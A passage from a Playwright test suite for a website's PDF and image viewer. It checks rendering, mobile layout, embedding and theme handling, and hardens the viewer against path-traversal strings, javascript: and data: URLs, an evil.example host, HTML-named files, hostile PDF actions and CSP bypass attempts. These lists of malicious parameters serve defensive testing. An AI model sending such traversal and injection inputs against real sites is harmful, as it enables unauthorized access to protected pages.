    const reqs = requestsSince(server, mark).map((x) => decodeURIComponent(x.path));
    assert.ok(reqs.includes('/viewer/vendor/pdfjs/cmaps/UniGB-UCS2-H.bcmap'), 'cmap fetched: ' + reqs.filter((p) => p.includes('cmaps')));
    assert.equal(await page.title(), '中文字体 测试.pdf');
    await page.screenshot({ path: path.join(SHOTS, 'cjk.png') });
  });

  await test('PDF links: only https and in-document jumps become links (no javascript:)', async () => {
    await page.goto(viewerUrl(LINKS_PDF));
    await waitReady(page);
    await waitPageRendered(page, 1);
    await page.waitForSelector('.page[data-page-number="1"] .linkLayer a');
    const links = await page.$$eval('.page[data-page-number="1"] .linkLayer a', (as) => as.map((a) => ({ href: a.getAttribute('href'), target: a.target, rel: a.rel })));
    assert.equal(links.length, 2, JSON.stringify(links));
    assert.deepEqual(links[0], { href: 'https://example.com/', target: '_blank', rel: 'noopener noreferrer nofollow' });
    assert.equal(links[1].href, '#');
    const jsHrefs = await page.$$eval('[href], [src], [action]', (els) => els.map((e) => e.getAttribute('href') || e.getAttribute('src') || e.getAttribute('action')).filter((v) => /^\s*javascript:/i.test(v)));
    assert.deepEqual(jsHrefs, [], 'no javascript: URL anywhere in the DOM');
    await page.click('.page[data-page-number="1"] .linkLayer a[data-dest]');
    await page.waitForFunction(() => document.documentElement.getAttribute('data-current-page') === '2');
    assert.ok(page.url().startsWith(SITE + '/viewer/'), 'did not navigate away');
  });

  await test('Chromium-made PDF: internal link jumps to page 5', async () => {
    await page.goto(viewerUrl(LONG_PDF));
    await waitReady(page);
    await waitPageRendered(page, 1);
    const sel = '.page[data-page-number="1"] .linkLayer a[data-dest]';
    const has = await page.waitForSelector(sel, { timeout: 5000 }).then(() => true, () => false);
    if (!has) {
      console.log('      (Chromium produced no internal link annotation — skipped)');
      return;
    }
    await page.click(sel);
    await page.waitForFunction(() => document.documentElement.getAttribute('data-current-page') === '5');
    const ext = await page.$$eval('.page[data-page-number="1"] .linkLayer a[target="_blank"]', (as) => as.map((a) => a.href));
    assert.deepEqual(ext, ['https://example.com/']);
  });

  await test('lang=en: English interface, home is /en/', async () => {
    await page.goto(viewerUrl(LONG_PDF, '&lang=en'));
    await waitReady(page);
    assert.equal(await page.getAttribute('html', 'lang'), 'en');
    assert.equal((await page.textContent('#download')).trim(), 'Download');
    assert.equal(await page.getAttribute('#zoom-in', 'aria-label'), 'Zoom in');
    assert.equal(await page.getAttribute('#zoom-fit', 'title'), 'Fit width');
    assert.equal(await page.getAttribute('#home', 'href'), SITE + '/en/');
    await page.goto(viewerUrl('/documents/does-not-exist.pdf', '&lang=en'));
    await page.waitForFunction(() => document.documentElement.getAttribute('data-error') === 'missing');
    assert.match(await page.textContent('#status'), /File not found/);
  });

  await test('missing / broken / password-protected PDFs show friendly messages', async () => {
    await page.goto(viewerUrl('/documents/does-not-exist.pdf'));
    await page.waitForFunction(() => document.documentElement.getAttribute('data-error') === 'missing');
    assert.match(await page.textContent('#status'), /文件不存在或已被删除/);
    assert.doesNotMatch(await page.textContent('#status'), /null|undefined/);
    assert.equal(await page.isVisible('#download'), false, 'no download button for a missing file');
    await page.screenshot({ path: path.join(SHOTS, 'missing.png') });

    await page.goto(viewerUrl(BROKEN_PDF));
    await page.waitForFunction(() => document.documentElement.getAttribute('data-error') === 'invalid');
    assert.match(await page.textContent('#status'), /文件已损坏/);

    await page.goto(viewerUrl(LOCKED_PDF));
    await page.waitForFunction(() => document.documentElement.getAttribute('data-error') === 'password');
    assert.match(await page.textContent('#status'), /设有密码/);
    assert.equal(await page.getAttribute('[data-testid="viewer-message-download"]', 'href'), LOCKED_PDF);
  });

  await test('image files show as <img>; tap toggles actual size', async () => {
    await page.goto(viewerUrl(PNG));
    await page.waitForFunction(() => { const i = document.querySelector('[data-testid="viewer-image"]'); return i && i.complete && i.naturalWidth > 0; });
    assert.equal(await page.getAttribute('[data-testid="viewer-image"]', 'src'), PNG);
    assert.equal(await page.title(), 'photo.png');
    assert.equal(await page.isVisible('#pager'), false);
    await page.click('[data-testid="viewer-image"]');
    assert.ok(await page.$eval('[data-testid="viewer-image-wrap"]', (w) => w.classList.contains('natural')));
    await page.goto(viewerUrl('/images/gone.png'));
    await page.waitForFunction(() => /图片不存在/.test(document.getElementById('status').textContent));
  });

  await test('other file types (.docx) offer a download instead', async () => {
    const mark = server.log.length;
    await page.goto(viewerUrl(DOCX));
    await page.waitForFunction(() => document.documentElement.getAttribute('data-error') === 'unsupported');
    assert.match(await page.textContent('#status'), /暂不支持在线预览/);
    const a = await page.$eval('[data-testid="viewer-message-download"]', (a) => ({ href: a.getAttribute('href'), download: a.getAttribute('download') }));
    assert.deepEqual(a, { href: DOCX, download: 'notes.docx' });
    assert.ok(!requestsSince(server, mark).some((x) => x.path.startsWith('/documents/')), 'the .docx itself is not fetched');
    await page.screenshot({ path: path.join(SHOTS, 'unsupported.png') });
  });

  await test('rejected file parameters show an error and fetch nothing outside the viewer', async () => {
    const bad = ['https://evil.example/x.pdf', '//evil.example/x.pdf', 'javascript:alert(1)', '/admin/index.html', '/admin/',
      '/documents/../admin/x.pdf', '/documents/%2e%2e/admin/x.pdf', '/documents/%2E%2E/%2E%2E/admin/index.html', '/documents/%252e%252e/admin/x.pdf',
      '/documents\\..\\admin\\x.pdf', '\\\\evil.example\\x.pdf', '/viewer/index.html', 'documents/x.pdf', '/documents/x.pdf\r\n', ' /documents/x.pdf'];
    const extBefore = externalRequests.length;
    for (const b of bad) {
      const mark = server.log.length;
      await page.goto(viewerUrl(b));
      await page.waitForFunction(() => document.documentElement.getAttribute('data-error') === 'bad-param', null, { timeout: 10000 });
      assert.match(await page.textContent('#status'), /无法预览这个链接/);
      assert.equal(await page.isVisible('#download'), false);
      await page.waitForTimeout(150); // give any (wrong) request a chance to show up
      const paths = requestsSince(server, mark).map((x) => x.path);
      const outside = paths.filter((p) => !(p.startsWith('/viewer/') || p === '/' || p === '/favicon.jpg'));
      assert.deepEqual(outside, [], `param ${JSON.stringify(b)} caused requests ${outside}`);
      assert.ok(page.url().startsWith(SITE + '/viewer/'), 'stayed on the viewer');
    }
    // A raw (un-encoded) query is decoded by URLSearchParams and must be refused just the same.
    for (const raw of ['?file=/documents/%2e%2e/admin/x.pdf', '?file=%2F%2Fevil.example%2Fx.pdf', '?file=/documents/..%2Fadmin%2Fx.pdf', '?file=']) {
      const mark = server.log.length;
      await page.goto(`${SITE}/viewer/${raw}`);
      await page.waitForFunction(() => /bad-param|no-file/.test(document.documentElement.getAttribute('data-error') || ''));
      const outside = requestsSince(server, mark).map((x) => x.path).filter((p) => !(p.startsWith('/viewer/') || p === '/' || p === '/favicon.jpg'));
      assert.deepEqual(outside, [], raw);
    }
    await page.goto(`${SITE}/viewer/`);
    await page.waitForFunction(() => document.documentElement.getAttribute('data-error') === 'no-file');
    assert.match(await page.textContent('#status'), /没有指定要预览的文件/);
    assert.equal(externalRequests.length, extBefore, 'no external requests: ' + JSON.stringify(externalRequests.slice(extBefore)));
    await page.goto(viewerUrl('https://evil.example/x.pdf'));
    await page.waitForFunction(() => document.documentElement.getAttribute('data-error') === 'bad-param');
    await page.screenshot({ path: path.join(SHOTS, 'rejected.png') });
  });

  await test('embed=1: compact bar with 「在新页面打开」 and 下载', async () => {
    await page.setViewportSize({ width: 760, height: 620 });
    await page.goto(viewerUrl(LONG_PDF, '&lang=zh&embed=1'));
    await waitReady(page);
    await waitPageRendered(page, 1);
    assert.ok(await page.evaluate(() => document.documentElement.classList.contains('embed')));
    assert.equal(await page.isVisible('#home'), false);
    assert.equal(await page.isVisible('#open-new'), true);
    assert.equal((await page.textContent('#open-new')).trim(), '在新页面打开');
    assert.equal(await page.getAttribute('#open-new', 'target'), '_blank');
    assert.equal(await page.getAttribute('#open-new', 'href'), `?file=${encodeURIComponent(LONG_PDF)}`);
    const bar = await page.$eval('#bar', (b) => b.getBoundingClientRect().height);
    assert.ok(bar <= 46, 'compact bar: ' + bar);
    await page.evaluate(() => window.scrollTo(0, document.querySelector('.page[data-page-number="4"]').offsetTop));
    await page.waitForFunction(() => /page=4|page=3/.test(document.getElementById('open-new').getAttribute('href')));
    await page.setViewportSize({ width: 1280, height: 800 });
  });

  await test('viewer reads no localStorage key except pref-theme; dark mode follows it', async () => {
    const access = await page.evaluate(() => window.__storageAccess.filter((a) => !a.startsWith('setItem:admin.token')));
    assert.ok(access.every((a) => a === 'getItem:pref-theme'), 'storage access: ' + access);
    const dctx = await newContext(browser, { colorScheme: 'light' }, { storage: { 'pref-theme': 'dark', 'admin.token': FAKE_TOKEN }, label: 'dark' });
    const dp = await dctx.newPage();
    await dp.goto(viewerUrl(LONG_PDF));
    await waitReady(dp);
    await waitPageRendered(dp, 1);
    assert.equal(await dp.getAttribute('html', 'data-theme'), 'dark');
    const bg = await dp.evaluate(() => getComputedStyle(document.body).backgroundColor);
    assert.equal(bg, 'rgb(24, 25, 27)');
    const pageBg = await dp.$eval('.page', (d) => getComputedStyle(d).backgroundColor);
    assert.equal(pageBg, 'rgb(255, 255, 255)', 'the paper stays white');
    await dp.screenshot({ path: path.join(SHOTS, 'dark.png') });
    // follows the system when there is no preference
    const sctx = await newContext(browser, { colorScheme: 'dark' }, { label: 'system-dark' });
    const sp = await sctx.newPage();
    await sp.goto(viewerUrl(PNG));
    assert.equal(await sp.getAttribute('html', 'data-theme'), 'dark');
    await sp.evaluate(() => { localStorage.setItem('pref-theme', 'light'); });
    // a pref-theme change from another tab/frame (the main site's toggle) applies live
    const other = await sctx.newPage();
    await other.goto(viewerUrl(DOCX));
    await other.evaluate(() => localStorage.setItem('pref-theme', 'dark'));
    await sp.waitForFunction(() => document.documentElement.getAttribute('data-theme') === 'dark');
    await other.evaluate(() => localStorage.setItem('pref-theme', 'light'));
    await sp.waitForFunction(() => document.documentElement.getAttribute('data-theme') === 'light');
    await dctx.close();
    await sctx.close();
  });

  await test('phone 390×844: fits the width, no sideways scroll, pinch zoom', async () => {
    const pctx = await newContext(browser, {
      viewport: { width: 390, height: 844 }, deviceScaleFactor: 3, isMobile: true, hasTouch: true,
      userAgent: 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36 MicroMessenger/8.0.47',
    }, { label: 'phone' });
    const pp = await pctx.newPage();
    await pp.goto(viewerUrl(LONG_PDF));
    await waitReady(pp);
    const st = await waitPageRendered(pp, 1);
    const m = await pp.evaluate(() => ({ sw: document.documentElement.scrollWidth, cw: document.documentElement.clientWidth, pw: document.querySelector('.page').getBoundingClientRect().width }));
    assert.ok(m.sw <= m.cw, 'no horizontal scroll: ' + JSON.stringify(m));
    assert.ok(m.pw >= m.cw - 20 && m.pw <= m.cw, 'first page fits the width: ' + JSON.stringify(m));
    assert.ok(st.width >= st.cssWidth * 2.5, 'canvas rendered for dpr 3: ' + JSON.stringify(st));
    const barH = await pp.$eval('#bar', (b) => b.getBoundingClientRect().height);
    assert.ok(barH <= 50, 'single-row bar on phones: ' + barH);
    // nothing in the bar overflows
    const over = await pp.evaluate(() => [...document.querySelectorAll('#bar *')].filter((e) => e.getClientRects().length && e.getBoundingClientRect().right > document.documentElement.clientWidth + 0.5).map((e) => e.id || e.className));
    assert.deepEqual(over, []);
    await pp.screenshot({ path: path.join(SHOTS, 'phone.png') });
    // two-finger pinch (CDP touch events) → zoom in, re-rendered, page now wider than the screen
    const z0 = Number(await attr(pp, 'data-zoom'));
    const pointAt = (x, y) => pp.evaluate(([x, y]) => {
      const d = [...document.querySelectorAll('.page')].find((e) => { const r = e.getBoundingClientRect(); return r.top <= y && r.bottom > y; });
      const r = d.getBoundingClientRect();
      return { n: d.dataset.pageNumber, fx: (x - r.left) / r.width, fy: (y - r.top) / r.height };
    }, [x, y]);
    const before = await pointAt(195, 260);
    const cdp = await pctx.newCDPSession(pp);
    const touch = (type, pts) => cdp.send('Input.dispatchTouchEvent', { type, touchPoints: pts.map(([x, y], id) => ({ x, y, id })) });
    await touch('touchStart', [[160, 260], [230, 260]]);
    for (let i = 1; i <= 6; i++) await touch('touchMove', [[160 - i * 15, 260], [230 + i * 15, 260]]);
    await touch('touchEnd', []);
    await pp.waitForFunction((z0) => Number(document.documentElement.getAttribute('data-zoom')) > z0 * 1.5, z0);
    await waitPageRendered(pp, Number(await attr(pp, 'data-current-page')));
    const after = await pointAt(195, 260);
    assert.equal(after.n, before.n);
    assert.ok(Math.abs(after.fx - before.fx) < 0.03 && Math.abs(after.fy - before.fy) < 0.03, `pinch centre kept: ${JSON.stringify([before, after])}`);
    const m2 = await pp.evaluate(() => ({ sw: document.documentElement.scrollWidth, cw: document.documentElement.clientWidth,
      msw: document.getElementById('main').scrollWidth, mcw: document.getElementById('main').clientWidth,
      barRight: document.getElementById('download').getBoundingClientRect().right }));
    assert.ok(m2.msw > m2.mcw, 'zoomed in wider than the phone: the pages area scrolls sideways ' + JSON.stringify(m2));
    assert.ok(m2.sw <= m2.cw, 'the document itself never scrolls sideways (keeps the fixed bar on screen) ' + JSON.stringify(m2));
    assert.ok(m2.barRight <= m2.cw, 'download button still on screen');
    // the pinch centre stays roughly where the fingers were (anchor kept), and sideways panning works
    assert.ok(await pp.evaluate(() => document.getElementById('main').scrollLeft > 0), 'scrolled sideways to keep the pinch centre');
    await pp.screenshot({ path: path.join(SHOTS, 'phone-zoomed.png') });
    await pp.click('#zoom-fit');
    await pp.waitForFunction(() => document.documentElement.getAttribute('data-fit') === '1');
    await pp.waitForFunction(() => document.documentElement.scrollWidth <= document.documentElement.clientWidth);
    // embed on a phone
    await pp.goto(viewerUrl(LONG_PDF, '&embed=1'));
    await waitReady(pp);
    await waitPageRendered(pp, 1);
    const ov2 = await pp.evaluate(() => document.documentElement.scrollWidth <= document.documentElement.clientWidth);
    assert.ok(ov2, 'embed: no horizontal scroll on phones');
    await pp.screenshot({ path: path.join(SHOTS, 'phone-embed-direct.png') });
    await pctx.close();
  });

  for (const [lang, prefix] of [['zh', ''], ['en', '/en']]) {
    await test(`shortcode on ${prefix || ''}/posts/${POST_SLUG}/ (${lang})`, async () => {
      const sctx = await newContext(browser, { viewport: { width: 1100, height: 900 } }, { label: 'post-' + lang });
      const sp = await sctx.newPage();
      const resp = await sp.goto(`${SITE}${prefix}/posts/${POST_SLUG}/`);
      assert.equal(resp.status(), 200);
      const figs = await sp.$$eval('figure.pdf-embed', (fs) => fs.map((f) => {
        const i = f.querySelector('iframe');
        const links = [...f.querySelectorAll('.pdf-embed-actions a')].map((a) => ({ text: a.textContent.trim(), href: a.getAttribute('href'), target: a.getAttribute('target'), download: a.getAttribute('download') }));
        return { src: i.getAttribute('src'), title: i.title, loading: i.getAttribute('loading'), allow: i.getAttribute('allow'), ref: i.getAttribute('referrerpolicy'), style: i.getAttribute('style'), name: f.querySelector('.pdf-embed-name').textContent, links, h: i.getBoundingClientRect().height };
      }));
      assert.equal(figs.length, 3, JSON.stringify(figs));
      const [a, b, c] = figs;
      assert.equal(a.src, `/viewer/?file=${encodeURIComponent(LONG_PDF).replace(/%20/g, '+')}&lang=${lang}&embed=1`);
      assert.equal(a.loading, 'lazy');
      assert.equal(a.allow, 'fullscreen');
      assert.equal(a.ref, 'no-referrer');
      assert.equal(a.title, (lang === 'en' ? 'Preview: ' : '预览：') + '讲义-第1章.pdf');
      assert.equal(a.name, '讲义-第1章.pdf');
      assert.ok(a.h >= 420 && a.h <= 900, 'default height ' + a.h);
      assert.deepEqual(a.links.map((l) => l.text), lang === 'en' ? ['Open in new tab', 'Download'] : ['在新页面打开', '下载']);
      assert.equal(a.links[0].href, `/viewer/?file=${encodeURIComponent(LONG_PDF)}&lang=${lang}`);
      assert.equal(a.links[0].target, '_blank');
      assert.equal(decodeURIComponent(a.links[1].href), LONG_PDF);
      assert.equal(a.links[1].download, '讲义-第1章.pdf');
      // named params: page, height, title; the space in the file name is encoded
      assert.equal(b.src, `/viewer/?file=${encodeURIComponent(CJK_PDF).replace(/%20/g, '+')}&lang=${lang}&page=1&embed=1`);
      assert.match(b.style, /height:\s*480px/);
      assert.ok(Math.abs(b.h - 480) <= 2, 'custom height ' + b.h);
      assert.equal(b.name, '字体测试');
      assert.equal(decodeURIComponent(b.links[1].href), CJK_PDF);
      // the path without a leading slash was fixed up
      assert.ok(c.src.startsWith(`/viewer/?file=${encodeURIComponent(PNG)}&`), c.src);
      // the iframe actually renders the PDF in embed mode with the page language
      const handle = await sp.$('figure.pdf-embed iframe');
      await handle.scrollIntoViewIfNeeded();
      const frame = await handle.contentFrame();
      await frame.waitForFunction(() => document.documentElement.getAttribute('data-ready') === '1', null, { timeout: 30000 });
      await frame.waitForFunction(() => { const d = document.querySelector('.page[data-page-number="1"]'); return d && d.classList.contains('rendered'); });
      assert.equal(await frame.evaluate(() => document.documentElement.lang), lang === 'en' ? 'en' : 'zh-CN');
      assert.ok(await frame.evaluate(() => document.documentElement.classList.contains('embed')));
      assert.equal((await frame.textContent('#download')).trim(), lang === 'en' ? 'Download' : '下载');
      // lazy rendering inside the iframe uses the iframe's own viewport
      const inFrame = await frame.evaluate(() => [...document.querySelectorAll('.page')].filter((d) => d.querySelector('canvas')).length);
      assert.ok(inFrame >= 1 && inFrame <= 6, 'pages rendered in the iframe: ' + inFrame);
      await frame.evaluate(() => window.scrollTo(0, document.querySelector('.page[data-page-number="9"]').offsetTop));
      await frame.waitForFunction(() => document.querySelector('.page[data-page-number="9"] canvas'));
      await frame.evaluate(() => window.scrollTo(0, 0));
      await sp.evaluate(() => window.scrollBy(0, -80));
      await sp.screenshot({ path: path.join(SHOTS, `embed-${lang}.png`) });
      // phone width: the post (with iframes) has no sideways scroll
      await sp.setViewportSize({ width: 390, height: 844 });
      await sp.waitForTimeout(300);
      const m = await sp.evaluate(() => ({ sw: document.documentElement.scrollWidth, cw: document.documentElement.clientWidth, ih: document.querySelector('figure.pdf-embed iframe').getBoundingClientRect().height }));
      assert.ok(m.sw <= m.cw, 'post page: no horizontal scroll on phones ' + JSON.stringify(m));
      assert.ok(m.ih >= 360, 'iframe tall enough on phones: ' + m.ih);
      await handle.scrollIntoViewIfNeeded();
      await frame.waitForFunction(() => { const d = document.querySelector('.page[data-page-number="1"]'); return d && d.classList.contains('rendered'); });
      await sp.waitForTimeout(400);
      await sp.evaluate(() => window.scrollBy(0, -60));
      if (lang === 'zh') await sp.screenshot({ path: path.join(SHOTS, 'embed-phone.png') });
      await sctx.close();
    });
  }

  // ---- adversarial checks (verifier) ---------------------------------------------------------------------

  await test('more rejected parameters: mixed case, encoded admin, data:/blob:, repeated, too long, unicode', async () => {
    for (const bad of ['/ADMIN/x.pdf', '/%61dmin/x.pdf', '/%2561dmin%2F/x.pdf', '/Viewer/index.html', '/%76iewer/x.pdf', 'data:application/pdf;base64,JVBERi0=',
      'blob:https://himzfx.github.io/0b7c', '/documents/%25252e%25252e/admin/x.pdf', '/documents/..%2f..%2fadmin/x.pdf', '/%09/evil.example/x.pdf',
      '/documents/x.pdf\u2028', '/documents/x.pdf\u0085', '/documents/ ../x.pdf', '/documents/x.pdf/..', '/' + 'a'.repeat(3000) + '.pdf']) {
      assert.equal(parseFileParam(bad, 'https://himzfx.github.io').ok, false, `should reject ${JSON.stringify(bad.slice(0, 60))}`);
    }
    // look-alikes are accepted only as ordinary same-origin file names (they can never reach /admin/)
    assert.equal(parseFileParam('/documents/\uFF0Fadmin', 'https://himzfx.github.io').href, '/documents/%EF%BC%8Fadmin');
    assert.equal(parseFileParam('/documents/x.pdf?x=/admin', 'https://himzfx.github.io').href, '/documents/x.pdf%3Fx%3D/admin');
    for (const raw of ['?file=/admin/index.html&file=' + encodeURIComponent(LONG_PDF), '?file=%2FAdmin%2Findex.html', '?file=%252Fadmin%252Findex.html',
      '?file=data%3Aapplication%2Fpdf%3Bbase64%2CJVBERi0', '?file=blob%3Ahttp%3A%2F%2Fx%2Fy', '?file=' + 'A'.repeat(5000), '?file=%2F%0A%2Fevil.example%2Fx.pdf',
      '?FILE=/admin/', '?file[]=/admin/', '#?file=/admin/', '?file=%2Fdocuments%2Fx.pdf%23%2F..%2F..%2Fadmin']) {
      const mark = server.log.length;
      await page.goto(`${SITE}/viewer/${raw}`);
      await page.waitForFunction(() => /bad-param|no-file/.test(document.documentElement.getAttribute('data-error') || ''), null, { timeout: 10000 });
      await page.waitForTimeout(100);
      const outside = requestsSince(server, mark).map((x) => x.path).filter((p) => !(p.startsWith('/viewer/') || p === '/' || p === '/favicon.jpg'));
      assert.deepEqual(outside, [], raw.slice(0, 60));
    }
    // the FIRST file parameter wins (a second one cannot smuggle anything in)
    await page.goto(`${SITE}/viewer/?file=${encodeURIComponent(LONG_PDF)}&file=/admin/index.html`);
    await waitReady(page);
  });

  await test('HTML-ish file name: title, toolbar and download link are plain text / working URLs', async () => {
    await page.goto(viewerUrl(XSS_PDF));
    await waitReady(page);
    await waitPageRendered(page, 1);
    const r = await page.evaluate(() => ({ title: document.title, file: document.getElementById('file-name').textContent,
      imgs: document.querySelectorAll('img').length, dl: document.getElementById('download').getAttribute('href'), name: document.getElementById('download').getAttribute('download') }));
    const name = XSS_PDF.slice('/documents/'.length);
    assert.deepEqual([r.title, r.file, r.name, r.imgs], [name, name, name, 0]);
    assert.equal(await page.evaluate(async (h) => (await fetch(h)).status, r.dl), 200, 'download link works: ' + r.dl);
  });

  await test('hostile PDF actions: no script, no Launch / GoToR / data: / javascript: / form links', async () => {
    await page.goto(viewerUrl(ACTIONS_PDF));
    await waitReady(page);
    await waitPageRendered(page, 1);
    await page.waitForTimeout(500);
    const r = await page.evaluate(() => ({
      linkLayer: [...document.querySelectorAll('.page a')].map((a) => a.getAttribute('href')),
      forms: document.querySelectorAll('form, .page input, .page button, .page select, .page textarea').length,
    }));
    assert.deepEqual(r, { linkLayer: [], forms: 0 });
    // (dialogs from app.alert would be recorded as console problems → the last test fails)
  });

  await test('300-page PDF: canvases stay bounded while reading through; jumping works both ways', async () => {
    const t0 = Date.now();
    await page.goto(viewerUrl(HUGE_PDF));
    await waitReady(page);
    await waitPageRendered(page, 1);
    const firstMs = Date.now() - t0;
    assert.equal(await attr(page, 'data-pages'), String(HUGE_PAGES));
    let maxCanvases = 0;
    const count = () => page.evaluate(() => document.querySelectorAll('canvas').length);
    for (let i = 0; i < 40; i++) { // read through the first pages by scrolling
      await page.mouse.wheel(0, 700);
      await page.waitForTimeout(25);
      maxCanvases = Math.max(maxCanvases, await count());
    }
    for (const n of [150, 299, 300, 2]) {
      await page.fill('#page-input', String(n));
      await page.press('#page-input', 'Enter');
      await waitPageRendered(page, n);
      assert.equal(await attr(page, 'data-current-page'), String(n));
      maxCanvases = Math.max(maxCanvases, await count());
    }
    await page.waitForTimeout(300);
    const left = await renderedPages(page);
    assert.ok(maxCanvases <= 10, 'canvases ever alive: ' + maxCanvases);
    assert.ok(left.every((n) => n <= 6), 'far pages were freed after jumping back: ' + left);
    assert.ok(firstMs < 15000, 'first page in ' + firstMs + ' ms');
  });

  await test('Android WeChat 360×740 (touch, dpr 3, dark): fits, bar complete, download on screen', async () => {
    const wctx = await newContext(browser, { viewport: { width: 360, height: 740 }, deviceScaleFactor: 3, isMobile: true, hasTouch: true,
      colorScheme: 'dark', userAgent: WECHAT_UA }, { storage: { 'admin.token': FAKE_TOKEN }, label: 'wechat' });
    const wp = await wctx.newPage();
    await wp.goto(viewerUrl(CJK_PDF));
    await waitReady(wp);
    const st = await waitPageRendered(wp, 1);
    assert.ok(st.dark > 50, 'CJK page drawn: ' + JSON.stringify(st));
    const m = await wp.evaluate(() => ({ theme: document.documentElement.getAttribute('data-theme'), sw: document.documentElement.scrollWidth, cw: document.documentElement.clientWidth,
      dl: document.getElementById('download').getBoundingClientRect().right,
      over: [...document.querySelectorAll('#bar *')].filter((e) => e.getClientRects().length && e.getBoundingClientRect().right > document.documentElement.clientWidth + 0.5).map((e) => e.id || e.className) }));
    assert.deepEqual([m.theme, m.sw <= m.cw, m.dl <= m.cw, m.over], ['dark', true, true, []], JSON.stringify(m));
    assert.deepEqual(await wp.evaluate(() => window.__storageAccess.filter((a) => !a.startsWith('setItem:'))), ['getItem:pref-theme']);
    await wp.screenshot({ path: path.join(SHOTS, 'wechat-360.png') });
    await wctx.close();
  });

  await test('embed in very narrow columns (280 / 320 px): nothing in the bar is cut off', async () => {
    for (const w of [280, 320]) {
      await page.setViewportSize({ width: w, height: 600 });
      await page.goto(viewerUrl(LONG_PDF, '&embed=1'));
      await waitReady(page);
      await waitPageRendered(page, 1);
      const over = await page.evaluate(() => [...document.querySelectorAll('#bar *')].filter((e) => e.getClientRects().length && e.getBoundingClientRect().right > document.documentElement.clientWidth + 0.5).map((e) => e.id || e.className));
      assert.deepEqual(over, [], `bar overflows at ${w}px`);
      assert.equal(await page.isVisible('#download'), true);
      assert.equal(await page.getAttribute('#open-new', 'aria-label'), '在新页面打开', 'icon-only link keeps its name');
      if (w === 280) await page.screenshot({ path: path.join(SHOTS, 'embed-280.png') });
    }
    await page.setViewportSize({ width: 1280, height: 800 });
  });

  await test('back button: in-document jumps add no history; back returns to the post', async () => {
    const bctx = await newContext(browser, {}, { label: 'post-back' }); // a theme page first (its CDN requests are not the viewer's)
    const page = await bctx.newPage();
    await page.goto(`${SITE}/posts/${POST_SLUG}/`);
    await page.goto(viewerUrl(LONG_PDF));
    await waitReady(page);
    await waitPageRendered(page, 1);
    const h0 = await page.evaluate(() => history.length);
    await page.waitForSelector('.page[data-page-number="1"] .linkLayer a[data-dest]');
    await page.click('.page[data-page-number="1"] .linkLayer a[data-dest]');
    await page.fill('#page-input', '20');
    await page.press('#page-input', 'Enter');
    await page.click('#zoom-in');
    assert.equal(await page.evaluate(() => history.length), h0);
    assert.ok(!page.url().includes('#'), page.url());
    await page.goBack();
    assert.equal(new URL(page.url()).pathname, `/posts/${POST_SLUG}/`);
    await bctx.close();
  });

  await test('image previews report ready / missing like PDFs do', async () => {
    await page.goto(viewerUrl(PNG));
    await page.waitForFunction(() => document.documentElement.getAttribute('data-ready') === '1');
    await page.goto(viewerUrl('/images/gone.png'));
    await page.waitForFunction(() => document.documentElement.getAttribute('data-error') === 'missing');
  });

  for (const [lang, prefix] of [['zh', ''], ['en', '/en']]) {
    await test(`shortcode with tricky file names (#, %, quotes/<>&) on ${prefix}/posts/${NAMES_SLUG}/`, async () => {
      const nctx = await newContext(browser, { viewport: { width: 1100, height: 900 } }, { label: 'post-names-' + lang });
      const np = await nctx.newPage();
      assert.equal((await np.goto(`${SITE}${prefix}/posts/${NAMES_SLUG}/`)).status(), 200);
      const html = await np.content();
      assert.doesNotMatch(html, /<img src="?x"?/i, 'no HTML injected through the file name');
      const figs = await np.$$eval('figure.pdf-embed', (fs) => fs.map((f) => ({
        src: f.querySelector('iframe').getAttribute('src'),
        open: f.querySelector('.pdf-embed-actions a').getAttribute('href'),
        dl: f.querySelectorAll('.pdf-embed-actions a')[1].getAttribute('href'),
        download: f.querySelectorAll('.pdf-embed-actions a')[1].getAttribute('download'),
        name: f.querySelector('.pdf-embed-name').textContent,
      })));
      assert.equal(figs.length, 3);
      for (const [i, file] of [HASH_PDF, PCT_PDF, XSS_PDF].entries()) {
        const f = figs[i];
        const name = file.slice(file.lastIndexOf('/') + 1);
        assert.equal(f.name, name);
        assert.equal(f.download, name);
        assert.equal(new URL(f.src, SITE).searchParams.get('file'), file, 'iframe file param round-trips');
        assert.equal(new URL(f.src, SITE).searchParams.get('lang'), lang);
        assert.equal(new URL(f.open, SITE).searchParams.get('file'), file);
        const res = await np.evaluate(async (h) => { const r = await fetch(h); return { status: r.status, len: (await r.arrayBuffer()).byteLength }; }, f.dl);
        assert.equal(res.status, 200, `download link ${f.dl} works`);
        assert.equal(res.len, fs.statSync(path.join(SITE_DIR, 'documents', name)).size, 'the right file is downloaded');
        // the 「在新页面打开」 link renders the PDF
        const vp = await nctx.newPage();
        await vp.goto(new URL(f.open, SITE + prefix + '/posts/').href);
        await waitReady(vp);
        await waitPageRendered(vp, 1);
        assert.equal(await vp.textContent('#file-name'), name);
        await vp.close();
      }
      await nctx.close();
    });
  }

  await test('CSP: an injected inline script never runs; eval is blocked for page scripts', async () => {
    // a same-origin helper script (allowed by script-src 'self') that tries eval / new Function
    fs.writeFileSync(path.join(SITE_DIR, '__csp-probe.js'), "try{eval('window.__eval=1')}catch(e){window.__evalBlocked=String(e.name)}try{new Function('window.__fn=1')()}catch(e){window.__fnBlocked=String(e.name)}");
    const cctx = await browser.newContext(); // not watched: the violations below are deliberate
    await cctx.route('**/*', (r) => (r.request().url().startsWith(SITE + '/') ? r.continue() : r.abort()));
    const cp = await cctx.newPage();
    await cp.goto(viewerUrl(PNG));
    const r = await cp.evaluate(async () => {
      const s = document.createElement('script');
      s.textContent = 'window.__inline = 1';
      document.head.append(s);
      const d = document.createElement('script');
      d.src = 'data:text/javascript,window.__data=1';
      document.head.append(d);
      const p = document.createElement('script');
      p.src = '/__csp-probe.js';
      document.head.append(p);
      await new Promise((ok) => { p.onload = ok; p.onerror = ok; });
      await new Promise((ok) => setTimeout(ok, 200));
      return { inline: window.__inline, data: window.__data, eval: window.__eval, fn: window.__fn, evalBlocked: window.__evalBlocked, fnBlocked: window.__fnBlocked };
    });
    assert.deepEqual(r, { inline: undefined, data: undefined, eval: undefined, fn: undefined, evalBlocked: 'EvalError', fnBlocked: 'EvalError' });
    await cctx.close();
    fs.rmSync(path.join(SITE_DIR, '__csp-probe.js'));
  });

  await test('no console errors or CSP violations in the viewer', async () => {
    // On the theme's post pages, external resources (fonts/CDN/giscus) are blocked by the test → ignore those.
    const problems = consoleProblems.filter((p) => {
